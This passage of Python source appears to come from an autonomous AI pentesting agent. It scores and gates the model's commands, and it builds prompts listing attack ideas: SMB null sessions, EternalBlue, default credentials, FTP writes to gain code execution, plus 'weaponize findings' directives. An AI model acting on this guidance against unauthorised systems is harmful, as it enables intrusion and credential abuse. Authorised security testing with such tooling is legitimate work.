    def _all_viable_categories_exhausted(self) -> Tuple[bool, list]:
        """Check if every plausible attack category is banned, dead, or exhausted.
        Returns (all_exhausted, sorted_available_categories).

        Critical fix: don't mark categories exhausted just because they hit a hard limit
        if the target still has un-exploited services/credentials/known CVEs.
        """
        t = (self.target or "").lower().strip()
        is_ip_target = bool(re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', t))
        blocks = set()
        blocks.update(self._banned_categories)
        blocks.update(self._banned_plan_categories)
        blocks.update(self._dead_branches)
        blocks.update(self._exhausted_techniques)

        model = self.model
        has_creds = bool(model.credentials)
        has_open_ports = bool(model.ports)
        # Services with known CVEs that should not be considered exhausted
        exploit_keywords = ["tomcat", "apache", "nginx", "openssh", "openssl",
                            "redis", "mysql", "postgres", "mongodb", "docker", "kubernetes",
                            "jenkins", "gitlab", "wordpress", "django", "flask", "spring",
                            "ajp", "ghostcat", "_MSF"]
        has_exploit_target = any(
            any(kw in f"{p.get('service','')} {p.get('product','')} {p.get('version','')}".lower() for kw in exploit_keywords)
            for p in model.ports
        ) or any("cve" in (p.get("service", "") + p.get("product", "")).lower() for p in model.ports)

        # Hard-limit based exhaustion — softened:
        # - web categories: only exhaust if no creds/exploitable services remain
        # - ssh/smb/database/ad: only exhaust on public_real_world or if truly dead
        # - IP-only targets skip dns/subdomain entirely
        soft_cats = set()
        if is_ip_target:
            soft_cats.update({"subdomain_recon", "dns_recon"})
        if has_creds or has_exploit_target:
            soft_cats.update({"web", "web_exploit", "web_scanner", "web_dirbust",
                              "ssh", "smb", "database", "ad", "privesc", "network"})
        for cat, count in self._category_hard_limits.items():
            if count >= 5 and cat not in soft_cats:
                blocks.add(cat)

        if self.target_type == "public_real_world":
            blocks.update({"privesc"})

        available = [c for c in [
            "web", "web_scanner", "web_exploit", "web_dirbust",
            "subdomain_recon", "dns_recon", "fingerprint", "port_scan",
            "network", "smb", "ssh", "database", "ad", "mobile",
            "privesc", "container", "analysis",
        ] if c not in blocks]
        return len(available) == 0, available

    def _branch_update(self, category: str, productive: bool):
        """Track per-category productivity; 5 unproductive runs in a row = dead branch.
        A single productive run resets the counter and revives a previously dead branch."""
        runs = self._branch_runs.setdefault(category, [])
        runs.append(bool(productive))
        del runs[:-5]
        if productive and category in self._dead_branches:
            self._dead_branches.discard(category)
            print(f"{C.G}[Branch] Category '{category}' revived by productive run{C.N}")
        if len(runs) == 5 and not any(runs) and category != "other":
            self._dead_branches.add(category)

    @staticmethod
    def _tool_name(command: str) -> str:
        for t in (command or "").split():
            if t in ("sudo", "env", "time", "nohup") or "=" in t:
                continue
            return os.path.basename(t)
        return ""

    def _record_tool_effect(self, commands, productive: bool):
        """Per-tool win/run scoring so the planner prefers high-yield tools and drops 0-yield ones."""
        for c in ([commands] if isinstance(commands, str) else (commands or [])):
            tool = self._tool_name(c)
            if not tool:
                continue
            rec = self._tool_effect.setdefault(tool, {"runs": 0, "wins": 0})
            rec["runs"] += 1
            if productive:
                rec["wins"] += 1

    def _tool_effectiveness_block(self) -> str:
        items = [(t, r) for t, r in self._tool_effect.items() if r["runs"] >= 2]
        if not items:
            return ""
        items.sort(key=lambda x: x[1]["wins"] / x[1]["runs"])
        lines = []
        for t, r in items[:6]:
            rate = r["wins"] / r["runs"]
            tag = "AVOID(0-yield)" if rate == 0 else ("low-yield" if rate < 0.34 else "ok")
            lines.append(f"  {t}: {r['wins']}/{r['runs']} productive — {tag}")
        return "TOOL EFFECTIVENESS (prefer high-yield; stop using 0-yield tools):\n" + "\n".join(lines)

    def _info_gain_scorer(self, command: str) -> int:
        """Score a command for information gain potential (0-10). Returns 5+ if
        the command actually grew the model (new ports/endpoints/findings)."""
        if not command or not command.strip():
            return 0
        # Check if model grew since command ran — this is the real measure of gain
        try:
            size_now = self._model_size()
            size_before = getattr(self, "_size_before_extraction", 0)
            if size_now > size_before:
                return min(10, 5 + (size_now - size_before))
        except Exception:
            pass
        cmd_lower = command.strip().lower()
        base = cmd_lower.split()[0] if cmd_lower.split() else ""

        help_markers = ("--help", "-h", "man ", "apropos ", "whatis ", "help(")
        if any(m in cmd_lower for m in help_markers):
            return 0

        # Map tools by function for scoring — nmap is a core scanner
        scanner_tools = {"nuclei", "ffuf", "dirsearch", "gobuster", "katana", "gospider",
                         "arjun", "gau", "wpscan", "joomscan", "droopescan",
                         "jaeles", "dalfox", "crlfuzz", "commix", "xsstrike", "sqlmap",
                         "testssl", "sslscan", "nmap", "masscan"}
        if base in scanner_tools:
            # If we already have data, still score as ongoing recon
            if self._recon_total >= 5:
                return 3
            return 7

        enum_tools = {"subfinder", "amass", "findomain", "assetfinder", "httpx", "httprobe"}
        if base in enum_tools:
            return 6

        exploit_markers = {"exploit", "shell", "rce", "upload", "sqli", "xss", "ssrf", "lfi", "rfi", "idor", "injection", "payload", "cve"}
        if any(m in cmd_lower for m in exploit_markers):
            if self._current_focus_finding:
                return 9
            has_high = any(f.severity in ("critical", "high") for f in self.model.findings)
            if has_high:
                return 8
            return 7

        url_in_cmd = re.findall(r'https?://[^\s\'\"<>]+', cmd_lower)
        if url_in_cmd:
            known_urls = {e["url"].lower().rstrip("/") for e in self.model.endpoints}
            for u in url_in_cmd:
                stripped = u.rstrip("/")
                if stripped in known_urls:
                    return 1
                if any(k.startswith(stripped) or stripped.startswith(k) for k in known_urls):
                    return 2
            return 6

        if re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+\b', cmd_lower):
            return 6

        return 5

    def _justification_gate(self, reasoning: str, thinking: str, command: str) -> Tuple[bool, str]:
        """Validate the AI's justification for a command against 5 criteria.
        Critically: check that the justification references REAL session data
        (open ports, service versions, found usernames, found paths, endpoints).
        Returns (pass, explanation) where pass means the justification is adequate."""
        if not command or not command.strip():
            return False, "no command to justify"
        combined = f"{reasoning} {thinking} {command}".lower()
        score = 0
        checks = []

        # 0. REAL SESSION DATA CHECK — must reference something that actually exists in this session
        model = getattr(self, "model", None)
        session_data_refs = []
        if model:
            port_nums = {str(p["port"]) for p in model.ports}
            service_names = {p["service"].lower() for p in model.ports}
            endpoint_urls = {e["url"].lower() for e in model.endpoints}
            subdomain_list = {s.lower() for s in model.subdomains}
            finding_titles = {f.title.lower() for f in model.findings}
            cred_services = {c["service"].lower() for c in model.credentials}

            # Check if any real port number is mentioned
            for pn in port_nums:
                if pn in combined:
                    session_data_refs.append(f"port {pn}")
                    break
            # Check if any real service is mentioned
            for sn in service_names:
                if sn in combined and len(sn) > 2:
                    session_data_refs.append(f"service {sn}")
                    break
            # Check if any real endpoint URL is mentioned (by path)
            for eu in endpoint_urls:
                path = eu.split("://")[-1].split("/", 1)[-1] if "://" in eu else ""
                if path and path[:30] in combined:
                    session_data_refs.append(f"endpoint {path[:30]}")
                    break
            # Check if any real subdomain is mentioned
            for sd in subdomain_list:
                if sd in combined and sd.count(".") >= 1:
                    session_data_refs.append(f"subdomain {sd}")
                    break
            # Check if any real finding title is referenced
            for ft in finding_titles:
                if ft[:30] in combined:
                    session_data_refs.append(f"finding '{ft[:30]}'")
                    break
            # Check if any real credential is mentioned
            for cs in cred_services:
                if cs in combined:
                    session_data_refs.append(f"credentials for {cs}")
                    break

        has_session_data = len(session_data_refs) > 0
        if has_session_data:
            score += 2
            checks.append(f"references real session data: {', '.join(session_data_refs[:3])}")
        else:
            checks.append("no real session data referenced")

        # 1. Tool-target match: mentions tool AND target/service/port/domain
        has_tool = bool(re.search(r'(curl|nmap|httpx|nuclei|ffuf|gobuster|dig|nslookup|whois|whatweb|wappalyzer|subfinder|amass|katana|gau|sqlmap|hydra|john|hashcat|metasploit|msf|burp|smtp|pop3|imap|ldap|smb|ssh|telnet|ftp|tftp|snmp|dns|python|python3|ajp|ghostcat|ajpshooter|exploit|script|cve)', combined))
        has_target = bool(re.search(r'(target|host|domain|subdomain|ip|port|service|url|endpoint|path|parameter|server|app|api|endpoint|site|web|http)', combined))
        if has_tool and has_target:
            score += 1
            checks.append("tool-target match")
        # 2. Fuzzing appropriateness (only applies if command is fuzzing)
        is_fuzz = bool(re.search(r'(ffuf|gobuster|dirsearch|dirb|wfuzz|fuzz|gau|katana|brute|bruteforce)', combined))
        if is_fuzz:
            has_fuzz_just = bool(re.search(r'(parameter|input|field|endpoint|directory|path|file|discover|find|hidden|enum|brute)', combined))
            if has_fuzz_just:
                score += 1
                checks.append("fuzzing justified")
        # 3. Enumeration appropriateness (only applies if command is enumeration)
        is_enum = bool(re.search(r'(subfinder|amass|httpx|nmap|dns|dig|nslookup|whois|whatweb|enum|recon|scan|probe)', combined))
        if is_enum:
            has_enum_just = bool(re.search(r'(what|version|os|service|port|domain|subdomain|endpoint|asset|surface|attack.*surface|info)', combined))
            if has_enum_just:
                score += 1
                checks.append("enumeration justified")
        # 4. New evidence potential
        has_evidence = bool(re.search(r'(new|evidence|find|discover|learn|reveal|show|output|result|data|info|gain|insight|detect|identify|check|test|verify|confirm)', combined))
        if has_evidence:
            score += 1
            checks.append("evidence potential")
        # 5. Exploit justification (applies to exploit/vulnerability testing commands)
        is_exploit = bool(re.search(r'(exploit|cve|ghostcat|ajp|rce|shell|upload|sqli|xss|ssrf|lfi|rfi|idor|injection|payload|vulnerability|python.*http|metasploit|msf)', combined))
        if is_exploit:
            has_exploit_just = bool(re.search(r'(version|port|service|vulnerable|attack|vector|impact|weaponize|chain|prove|confirm|verify)', combined))
            if has_exploit_just:
                score += 1
                checks.append("exploit justified")
        if score >= 3:
            return True, "; ".join(checks)
        if has_session_data and score >= 2:
            return True, "; ".join(checks)
        return False, f"weak justification ({score}/6 max): {'; '.join(checks) if checks else 'no criteria met'}"

    @staticmethod
    def _tool_failed(result: "ToolResult") -> Optional[str]:
        """Detect a tool that errored (missing/crashed/bad args) vs a clean empty run."""
        txt = (result.text or "").lower()
        markers = ("command not found", "no such file", "traceback (most recent call last)",
                   "modulenotfounderror", "importerror", "permission denied", "invalid option",
                   "unrecognized option", "could not resolve host", "fatal error")
        if result.returncode != 0:
            for m in markers:
                if m in txt:
                    return m
        return None

    @staticmethod
    def _is_empty_result(result: "ToolResult") -> bool:
        """rc=0 but no usable signal — must NOT be treated as evidence/progress."""
        return result.returncode == 0 and len((result.stdout or "").strip()) < 5

    @staticmethod
    def _output_quality(result: "ToolResult") -> str:
        """Assess tool output quality: 'good', 'weak', 'empty', or 'error'."""
        if result.error or result.returncode < 0:
            return "error"
        if result.returncode != 0:
            return "error"
        text = (result.stdout or "").strip()
        if not text:
            return "empty"
        if any(m in text for m in ("usage:", "Usage:", "ERROR:", "error:", "[error]")):
            return "error"
        if len(text) < 20:
            return "weak"
        lines = [l for l in text.split("\n") if l.strip()]
        if len(lines) <= 2 and all(len(l) < 30 for l in lines):
            return "weak"
        return "good"

    def _strategic_analysis(self) -> str:
        """Synthesize what we know into a strategic assessment — what to prioritize, what's missing, what's blocked."""
        lines = []
        model = self.model
        findings = model.findings
        ports = model.ports
        endpoints = model.endpoints
        tech = model.tech_stack

        # Attack surface summary
        web_ports = [p for p in ports if p.get("port") in (80, 443, 8080, 8443, 3000, 5000, 8000, 8888)]
        svc_ports = [p for p in ports if p.get("port") not in (80, 443, 8080, 8443, 3000, 5000, 8000, 8888)]
        lines.append(f"Attack surface: {len(web_ports)} web port(s), {len(svc_ports)} non-web service(s), {len(endpoints)} endpoint(s), {len(model.subdomains)} subdomain(s), {len(findings)} finding(s).")

        # What's been found vs what's being ignored
        high_findings = [f for f in findings if f.severity in ("critical", "high")]
        med_findings = [f for f in findings if f.severity == "medium"]
        if high_findings:
            lines.append(f"HIGH-VALUE FINDINGS: {len(high_findings)} critical/high — STOP broad recon. Exploit what you have. Each high finding MUST be weaponized.")

        # Missing expected ports
        has_web = any(p.get("port") in (80, 443, 8080, 8443) for p in ports)
        if not has_web and not model.subdomains and len(endpoints) < 3:
            lines.append("WARNING: No web ports or subdomains found. Try: reverse DNS, ASN-based CIDR scan, HTTP on nonstandard ports, cert transparency logs.")

        # Missing depth on found services
        service_ports = {p.get("port") for p in ports}
        rich_services = {21: "FTP null/anonymous", 22: "SSH keys/common creds", 25: "SMTP relay", 389: "LDAP anonymous", 445: "SMB null session", 1433: "MSSQL weak", 3306: "MySQL unauth", 5432: "PostgreSQL unauth", 6379: "Redis unauth", 27017: "Mongo unauth", 9200: "ES unauth"}
        missing_depth = [desc for port, desc in rich_services.items() if port in service_ports and f"{desc.split()[0].lower()}" not in " ".join(f.title.lower() for f in findings)]
        if missing_depth:
            lines.append(f"MISSING DEPTH: Services present but untested — {', '.join(missing_depth)}.")

        # Tech-specific gaps
        tech_str = " ".join(f"{k}" for k in tech).lower()
        framework_map = {
            "laravel": "Laravel: check /.env, /storage/logs, artisan key leak, debug mode",
            "django": "Django: check /admin, SECRET_KEY via error pages, DEBUG=True",
            "spring": "Spring: check /actuator, /heapdump, env leak, /mappings",
            "flask": "Flask: check /console (Werkzeug debug), DEBUG=True traces",
            "wordpress": "WordPress: wpscan, wp-config.php backup, xmlrpc.php",
            "next.js": "Next.js: check /_next/data, SSR injection, /api endpoints from pages",
            "express": "Express: check /debug, stack traces in 404s",
            "graphql": "GraphQL: introspection query, batch attacks, field suggestions",
        }
        found_gaps = [desc for keyword, desc in framework_map.items() if keyword in tech_str and not any(keyword in f.title.lower() for f in findings)]
        if found_gaps:
            lines.append(f"TECH GAPS: {' | '.join(found_gaps)}")

        # Existing-finding depth problem
        if len(findings) >= 3 and not high_findings:
            shallow = sum(1 for f in findings if len(f.evidence or "") < 50)
            if shallow >= 2:
                lines.append(f"SHALLOW FINDINGS: {shallow}/{len(findings)} have weak evidence. Re-examine each with: 1) manual proof, 2) impact assessment, 3) exploitation attempt. Do NOT add more low-quality findings.")

        # Credentials exist but unused
        if model.credentials and not any("cred" in f.title.lower() for f in findings):
            lines.append(f"CREDENTIALS ({len(model.credentials)}) unused — try on SSH, SMB, API auth, databases, web logins.")

        # Goal assessment
        if self.confidence_scorer and model.endpoints:
            current_cat = self._last_service_category or "recon"
            score = self.confidence_scorer.score_action(current_cat, model, self.failure_memory)
            if score < 0.3:
                lines.append(f"ACTION BLIND: current category '{current_cat}' has near-zero confidence ({score:.2f}). Pivot immediately.")

        return "\n".join(lines)

    def _finding_hypotheses(self) -> List[str]:
        """Turn collected recon into concrete next-step hypotheses so the agent pivots on findings."""
        h = []
        tech_raw = " ".join(f"{k} {v}" for k, v in self.model.tech_stack.items()).lower()
        all_port_nums = {p["port"] for p in self.model.ports}
        all_services = {p["service"].lower() for p in self.model.ports}
        all_endpoint_urls = [e["url"] for e in self.model.endpoints]
        all_statuses = {e.get("status") for e in self.model.endpoints if e.get("status")}

        if "wordpress" in tech_raw:
            h.append("WordPress → read wp-json/wp/v2/users, test xmlrpc.php SSRF/DoS, run wpscan --enumerate vp,u,tt")
        if any(f in tech_raw for f in ("laravel", "phpunit", "symfony")):
            h.append("PHP framework → probe /.env, /storage/logs/laravel.log, /debugbar, artisan routes leak, test mass assignment")
        if any(f in tech_raw for f in ("django", "flask", "fastapi")):
            h.append("Python web → probe /admin, /api/docs, /graphql, /static/..%5c..%5c, test debug=True error pages for stack traces")
        if any(f in tech_raw for f in ("spring", "struts", "tomcat")):
            h.append("Java web → probe /actuator, /actuator/env, /actuator/heapdump, /..%3B/, /WEB-INF/web.xml, test struts2 devmode")
        if any(f in tech_raw for f in ("next.js", "nextjs", "nuxt", "gatsby")):
            h.append("Node SSR → probe /_next/data/, /__nextjs_original-stack-frame, test server-side props injection, SSRF via SSR params")
        if any(f in tech_raw for f in ("express", "node")):
            h.append("Node.js/Express → probe /debug, /api-docs, 404 pages with stack traces, test prototype pollution via JSON body")
        if any(f in tech_raw for f in ("apache", "nginx", "iis")):
            h.append("Web server → probe /server-status, /.git/config, /.env.bak, /backup.zip, /phpinfo.php ONCE, check directory listing")
        if any(f in tech_raw for f in ("jquery", "bootstrap", "mootools")) and not any(f in tech_raw for f in ("wordpress", "django", "laravel", "spring", "next")):
            h.append("Static-site only (no backend detected) → stop server-side testing, check for S3/cloud bucket configs, JS secrets, CORS")
        if "graphql" in tech_raw or any("graphql" in u.lower() for u in all_endpoint_urls):
            h.append("GraphQL → probe introspection query, check for batching attacks, field suggestions, depth limit bypass")
        if "api" in tech_raw or any("api" in u.lower() for u in all_endpoint_urls):
            h.append("API endpoints → test for IDOR by incrementing IDs, check BOLA, test mass assignment (extra fields in JSON body), check rate limit headers")
        if any(f in tech_raw for f in ("jwt", "oauth", "oidc")):
            h.append("JWT/OAuth → decode token (base64), check alg=none, test jwk injection, check kid path traversal, test oauth misconfiguration (redirect_uri)")
        if 401 in all_statuses or 403 in all_statuses:
            h.append("Protected endpoints → test: X-Forwarded-For/Suffix bypass, HTTP method override (POST->PUT->PATCH->DELETE), default creds, path normalization bypass")
        if 200 in all_statuses and not all_statuses - {200}:
            h.append("All endpoints return 200 → likely a catch-all/SPA. Look for actual API routes in JS files, test parameter pollution")
        db_ports = {3306, 5432, 6379, 27017, 9200, 7687, 7474}
        exposed_db = [p["service"] for p in self.model.ports if p.get("port") in db_ports]
        if exposed_db:
            h.append(f"DB exposed ({', '.join(exposed_db)}) → test unauth access, default creds (root:root, admin:admin), check if bound to 0.0.0.0")
        if 445 in all_port_nums or "smb" in all_services:
            h.append("SMB → test null session (smbclient -N -L //target), check SMB signing, test MS17-010/EternalBlue, enumerate shares")
        if 389 in all_port_nums or 636 in all_port_nums or "ldap" in all_services:
            h.append("LDAP → try anonymous bind (ldapsearch -x -h target -b ''), dump naming contexts, check for cleartext creds")
        if 22 in all_port_nums or "ssh" in all_services:
            h.append("SSH → test weak ciphers (nmap --script ssh2-enum-algos), try common creds, check for authorized_keys file write")
        if 3389 in all_port_nums or "rdp" in all_services:
            h.append("RDP → test BlueKeep/CVE-2019-0708, check NLA enforcement, try default creds (Administrator:Administrator)")
        if 21 in all_port_nums or "ftp" in all_services:
            h.append("FTP → test anonymous login, try writable directory, check for .bash_profile write to get RCE")
        if 25 in all_port_nums or 587 in all_port_nums or "smtp" in all_services:
            h.append("SMTP → test open relay (swaks), enumerate users VRFY/EXPN/RCPT TO, check STARTTLS")
        if 443 in all_port_nums or 8443 in all_port_nums:
            h.append("HTTPS → check for insecure renegotiation, CRIME/BREACH, Heartbleed if old OpenSSL, test ALPACA")
        if self.model.findings:
            confirmed_keys = {k for k, v in self._hypotheses.items() if v.state == HYP_STATE_CONFIRMED}
            high_sev = [f for f in self.model.findings if f.severity in ("critical", "high")
                        and self._hypothesis_key({"severity": f.severity, "title": f.title}) in confirmed_keys]
            if high_sev:
                h.append("EXISTING HIGH FINDINGS (confirmed) — do not scan more. Exploit what you already found. Deepen each finding with: 1) confirm impact, 2) find proof, 3) chain with other low findings")
            med_sev = [f for f in self.model.findings if f.severity == "medium"
                       and self._hypothesis_key({"severity": f.severity, "title": f.title}) in confirmed_keys]
            if med_sev and not high_sev:
                h.append(f"MEDIUM findings exist ({len(med_sev)}, confirmed) — try to escalate to HIGH by chaining with info leaks or misconfigurations")
        if len(self.model.findings) >= 3 and not any(f.severity in ("critical", "high") for f in self.model.findings):
            h.append("Multiple findings but no confirmed high — STOP exploitation. Return to recon/validation to find a real vulnerability.")
        top = self._ranked_endpoints(3)
        if top:
            h.append("Top endpoints to weaponize: " + "; ".join(f"{u} (score {sc:.2f})" for u, sc in top))
        if self.model.credentials:
            h.append(f"CREDENTIALS ({len(self.model.credentials)}) exist — TRY: SSH login, SMB login, API auth, dashboard login, database auth")
        hyps = h[:6]
        return hyps

    def _ranked_endpoints(self, n: int) -> List[Tuple[str, float]]:
        scored = [(e["url"], self._score_endpoint(e)) for e in self.model.endpoints]
        scored.sort(key=lambda x: x[1], reverse=True)
        return scored[:n]

    def _ranked_assets_block(self) -> str:
        parts = []
        eps = self._ranked_endpoints(8)
        if eps:
            parts.append("RANKED ENDPOINTS (score — prioritize high, ignore low):")
            for u, sc in eps:
                parts.append(f"  {sc:.2f}  {u[:110]}")
        if self.model.subdomains:
            subs = sorted(self.model.subdomains, key=self._score_subdomain, reverse=True)[:8]
            parts.append("RANKED SUBDOMAINS:")
            for s in subs:
                parts.append(f"  {self._score_subdomain(s):.2f}  {s}")
        if self._dead_branches:
            parts.append(f"DEAD BRANCHES (stop — no new value): {', '.join(sorted(self._dead_branches))}")
        return "\n".join(parts)

    @staticmethod
    def _tool_family(command: str) -> str:
        """Classify a command into a tool family for diversity enforcement.
        Returns the family name or 'unknown'."""
        base = (command or "").strip().split()[0].lower().split("/")[-1] if command else ""
        if not base:
            return "unknown"
        # Strip path and version suffixes
        base = re.sub(r'[\d\._-]+$', '', base)
        # Direct lookup in the pre-built reverse map
        if base in _TOOL_TO_FAMILY:
            return _TOOL_TO_FAMILY[base]
        # Try partial matching - check if base starts with any known tool
        for tool, family in _TOOL_TO_FAMILY.items():
            if base.startswith(tool) or tool.startswith(base):
                return family
        return "unknown"

    def _tool_fixation_check(self, command: str) -> Tuple[bool, str]:
        """Check if the command's tool family has been overused recently.
        Does NOT modify state — pure check. Returns (blocked, message)."""
        family = self._tool_family(command)
        if family == "unknown":
            return False, ""
        recent = self._tool_family_history[-6:]
        same_count = sum(1 for f in recent if f == family)
        if same_count >= 4:
            return True, f"TOOL FAMILY FIXATION — '{family}' used {same_count}/10 times. Pick a tool from a different family. Available: curl (web_req), ffuf (dirbust), nmap (port_scan), nuclei (web_scanner), dig (dns), hydra (auth), sqlmap (web_exploit), testssl (crypto), smbclient (smb), awscli (cloud), katana (web_fuzz)"
        return False, f""

    def _record_tool_family(self, command: str):
        """Record tool family usage — only call this on ACTUALLY EXECUTED commands."""
        family = self._tool_family(command)
        if family == "unknown":
            return
        self._tool_family_history.append(family)
        if len(self._tool_family_history) > 15:
            self._tool_family_history = self._tool_family_history[-15:]

    def _generate_fallback_cmd(self) -> str:
        """Smart last-resort probe based on actual discovered services.
        Follows real pentester methodology — check what's been found and probe deepest first."""
        self._tool_family_history.clear()
        t = self.target.strip().lower()
        t = re.sub(r'^https?://', '', t)
        m = re.match(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::(\d+))?$', t)
        ip = m.group(1) if m else t
        port = m.group(2) if m and m.group(2) else ""

        # Check if we have any open ports from prior scans
        open_ports = set()
        try:
            open_ports = {int(p["port"]) for p in self.model.ports if p.get("state") in ("open", "")}
        except Exception:
            pass

        # Strategy: probe the most promising service first
        # 1. If we know a web port, use the discovered one first (not a hardcoded guess)
        discovered_web = self._get_web_port()
        if discovered_web:
            scheme = "https" if discovered_web in (443, 8443) else "http"
            return f"curl -sik --max-time 5 '{scheme}://{ip}:{discovered_web}/' 2>&1 | head -60"
        for wp in [8080, 443, 80, 8443, 8000, 3000, 5000, 9090]:
            if wp in open_ports:
                scheme = "https" if wp in (443, 8443) else "http"
                return f"curl -sik --max-time 5 '{scheme}://{ip}:{wp}/' 2>&1 | head -60"

        # 2. If we have a port number from target, probe that
        if port:
            scheme = "https" if port in ("443", "8443") else "http"
            return f"curl -sik --max-time 5 '{scheme}://{ip}:{port}/' 2>&1 | head -60"

        # 3. If SSH is open, try banner grab
        if 22 in open_ports:
            return f"curl -sik --max-time 5 'http://{ip}:22/' 2>&1 | head -30; echo '---'; nmap -sV -p 22 {ip} 2>&1 | head -20"

        # 4. Quick port scan if no known open ports
        if not open_ports:
            return f"nmap -Pn -n --top-ports 100 -sT --max-rtt-timeout 500ms --max-retries 1 {ip} 2>&1 | head -30"

        # 5. Generic probe on common ports
        for p in [80, 443, 8080, 8443]:
            scheme = "https" if p in (443, 8443) else "http"
            return f"curl -sik --max-time 5 '{scheme}://{ip}:{p}/' 2>&1 | head -30"

        # Ultimate fallback
        return f"curl -sik --max-time 5 'http://{ip}/' 2>&1 | head -30"

    def _target_host(self, target: Optional[str] = None) -> str:
        raw = (target or self.target or "").strip()
        raw = re.sub(r'^https?://', '', raw)
        return raw.split('/')[0]

    def _get_web_port(self) -> Optional[int]:
        """Return the first confirmed web port from model.ports, or None."""
        for p in self.model.ports:
            pn = int(p["port"])
            svc = p.get("service", "").lower()
            if svc in ("http", "https", "http-proxy") or pn in (80, 443, 8080, 8443, 8000, 3000, 5000, 9090):
                return pn
        return None

    def _web_url(self, host: str) -> str:
        """Return base URL with discovered port, e.g. http://target.com:8080."""
        port = self._get_web_port()
        if port:
            scheme = "https" if port in (443, 8443) else "http"
            return f"{scheme}://{host}:{port}"
        return f"http://{host}"

    def _wordlist_path(self, kind: str) -> str:
        """Return first existing path for a common wordlist, or '' if none.
        kind: ssh-users | ssh-passwords | web-paths | web-params
        """
        from pathlib import Path
        wl_dir = CONFIG.WORDLIST_DIR.rstrip("/")
        candidates = {
            "ssh-users": [
                f"{wl_dir}/seclists/Usernames/top-usernames-shortlist.txt",
                f"{wl_dir}/metasploit/unix_users.txt",
                f"{wl_dir}/seclists/Usernames/top-usernames-shortlist.txt",
            ],
            "ssh-passwords": [
                f"{wl_dir}/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
                f"{wl_dir}/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt",
                f"{wl_dir}/rockyou.txt",
            ],
            "web-paths": [
                f"{wl_dir}/seclists/Discovery/Web-Content/raft-medium.txt",
                f"{wl_dir}/seclists/Discovery/Web-Content/common.txt",
                f"{wl_dir}/dirb/common.txt",
            ],
        }
        for p in candidates.get(kind, []):
            if Path(p).exists():
                return p
        return ""

    def _queue_autonomy_tasks(self, active_node: str, failure_reason: str = "") -> int:
        """Populate a persistent fallback queue from live state and structured hypotheses."""
        return self.mission_manager.seed(active_node, failure_reason)

    def _autonomous_fallback_decision(self, target: str, active_node: str, failure_reason: str, last_output: str, iteration: int) -> Dict[str, Any]:
        """Last-resort decision when AI is unresponsive.

        Explicit sequence:
        1. Retry current provider with +60s timeout.
        2. Switch provider (reset failover router) and retry.
        3. Cooldown (brief sleep) then retry with simplified prompt.
        4. Final attempt with simplified prompt + extended timeout.
        5. If ALL providers fail, fail the mission instead of generating fake reasoning.
        """
        import time as _time
        from config import CONFIG
        from providers import ai_request_timeout

        def _try_ai(timeout_sec: int, custom_prompt: str = "") -> Optional[Dict[str, Any]]:
            old_to = CONFIG.AI_TIMEOUT
            CONFIG.AI_TIMEOUT = timeout_sec
            try:
                system_prompt = custom_prompt or (
                    "You are X19, an autonomous pentester. Reply with ONE JSON object. "
                    "If the prior command failed, try a different tool or different angle — "
                    "DO NOT repeat the same command. Be specific."
                )
                wake_ctx = (
                    f"Target: {target}\n"
                    f"Last output snippet: {(last_output or '')[:400]}\n\n"
                    "Reply with one JSON: {\"thinking\":\"...\",\"next_command\":\"<one shell cmd>\","
                    "\"reasoning\":\"tool:why, evidence:what\",\"finding\":null,\"completed\":false}"
                )
                resp = self.ai.chat(system_prompt, wake_ctx)
                if resp:
                    parsed = self._parse_decision(resp)
                    if parsed and (parsed.get("next_command") or parsed.get("plan")):
                        return parsed
            except Exception as e:
                log(f"[Loop] AI retry failed: {e}")
            finally:
                CONFIG.AI_TIMEOUT = old_to
            return None

        def _switch_provider():
            if hasattr(self.ai, '_exhausted'):
                self.ai._exhausted.clear()
                self.ai._working = None
            if hasattr(self.ai, '_provider_index'):
                self.ai._provider_index = 0
            return self.ai.name()

        normal_to = ai_request_timeout()
        generous_to = max(normal_to, 120)

        # Step 1: retry current provider with +60s
        result = _try_ai(generous_to + 60)
        if result:
            return result

        # Step 2: switch provider and retry
        provider = _switch_provider()
        print(f"{C.Y}[!] Falling back — switching provider to {provider} with {generous_to}s timeout{C.N}")
        result = _try_ai(generous_to)
        if result:
            return result

        # Step 3: cooldown + simplified prompt
        cooldown = min(30, max(5, self._rate_limit_backoff))
        print(f"{C.Y}[!] Cooldown {cooldown:.0f}s before simplified prompt retry{C.N}")
        try:
            _time.sleep(cooldown)
        except Exception:
            pass
        simple_prompt = (
            "You are a CTF solver. Output ONLY valid JSON with next_command to run. "
            "Start with: nmap -sV -p- <target>"
        )
        result = _try_ai(generous_to, simple_prompt)
        if result:
            return result

        # Step 4: final attempt with extended timeout
        final_prompt = (
            f"Target: {target}\nYour job: find a flag. Run recon commands (nmap, curl, gobuster). "
            "Reply JSON with next_command only."
        )
        result = _try_ai(max(generous_to, 180), final_prompt)
        if result:
            return result

        # Step 5: ALL providers failed — fail mission instead of generating fake reasoning
        print(f"{C.R}[!] All AI providers failed for target {target}. Failing mission.{C.N}")
        log(f"[Loop] All AI providers failed for {target}; mission aborted.")
        return {
            "thinking": "All AI providers are unresponsive after retry, provider switch, cooldown, and simplified prompts.",
            "reasoning": f"Mission aborted — {failure_reason or 'no AI response'} after maximum fallback attempts.",
            "next_command": "",
            "finding": None,
            "plan": None,
            "completed": False,
            "_mission_failed": True,
        }

    def _generate_structured_hypotheses(self) -> List[StructuredHypothesis]:
        from brain.planner import generate_structured_hypotheses
        from constants import SERVICE_ATTACKS
        self._generated_hypotheses = generate_structured_hypotheses(
            self.model, self.target, SERVICE_ATTACKS
        )
        return self._generated_hypotheses

    def _cve_context_block(self) -> str:
        from brain.context_builder import cve_context_block
        return cve_context_block(self.model)

    def _tool_failure_context(self) -> str:
        from brain.context_builder import tool_failure_context
        return tool_failure_context(list(self._broken_tools), dict(self._tool_failure_counts))

    def _session_outcomes_context(self) -> str:
        from brain.context_builder import session_outcomes_context
        return session_outcomes_context(list(self._session_outcomes))

    def _false_claim_context(self) -> str:
        from brain.context_builder import false_claim_context
        return false_claim_context(list(self._false_claim_urls))

    def _exploitation_context(self) -> str:
        """Generate specific exploitation commands based on confirmed findings.
        Turns findings into actionable exploitation steps for the AI."""
        if not self.model.findings:
            return ""
        lines = ["=== EXPLOITATION GUIDANCE ==="]
        host = re.sub(r'^https?://', '', self.target).split('/')[0]
        web_port = self._get_web_port()
